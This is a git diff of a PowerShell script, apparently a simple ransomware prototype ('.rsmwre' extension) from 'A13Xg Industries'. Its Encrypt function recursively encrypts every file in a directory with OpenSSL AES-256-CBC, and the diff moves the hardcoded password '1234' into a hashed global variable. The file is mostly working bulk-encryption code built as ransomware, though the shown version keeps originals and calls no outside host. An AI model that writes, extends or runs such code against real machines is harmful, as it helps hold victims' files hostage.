@@ -13,6 +13,7 @@ A13Xg Industries
     #// Example Decrpyt Function
 # openssl enc -d -aes-256-cbc -in encrypted.data -out un_encrypted.data
 
+[STRING]$global:Pswd = Echo 1234 | .\openssl.exe dgst -sha256
 function GetFileScope {
     [CmdletBinding()]
     param (
@@ -24,29 +25,27 @@ function GetFileScope {
 function Encrypt {
     [CmdletBinding()]
     param (
-       [STRING] $Pswd = '1234',
        [STRING] $Directory
     )
     $fileScope = (Get-ChildItem -Path "$Directory" -File -Recurse).FullName
     ForEach ($inFile in $fileScope) {
-        Write-Host "Encrypting $inFile ..."
+        Write-Host "Encrypting $inFile ..." -ForegroundColor Yellow -NoNewline
         $outFile = $inFile + '.rsmwre'
-        .\OpenSSL.exe enc -k $Pswd -aes-256-cbc -e -in $inFile -out $outFile
-        Write-Host "Done."
+        .\OpenSSL.exe enc -aes-256-cbc -e -in $inFile -out $outFile -k $Pswd 
+        Write-Host "Done." -ForegroundColor Green -NoNewline
     }
 }
 function Decrypt {
     [CmdletBinding()]
     param (
-       [STRING] $Pswd = '1234',
        [STRING] $Directory
     )
-    $fileScope = (Get-ChildItem -Path "$Directory*.rsmwre" -File -Recurse).FullName
+    $fileScope = (Get-ChildItem -Path "$Directory/*.rsmwre" -File -Recurse).FullName
     ForEach ($inFile in $fileScope) {
-        Write-Host "Decrypting $inFile ..."
-        $outFile = $inFile -replace ".*.rsmwre"
-        .\OpenSSL.exe enc -k $Pswd -aes-256-cbc -d -in $inFile -out $outFile
-        Write-Host "Done."
+        Write-Host "Decrypting $inFile ..." -ForegroundColor Yellow -NoNewline
+        $outFile = $inFile -replace ".rsmwre"
+        .\OpenSSL.exe enc -aes-256-cbc -d -in $inFile -out $outFile -k $Pswd
+        Write-Host "Done." -ForegroundColor Green -NoNewline
     }
 }
 
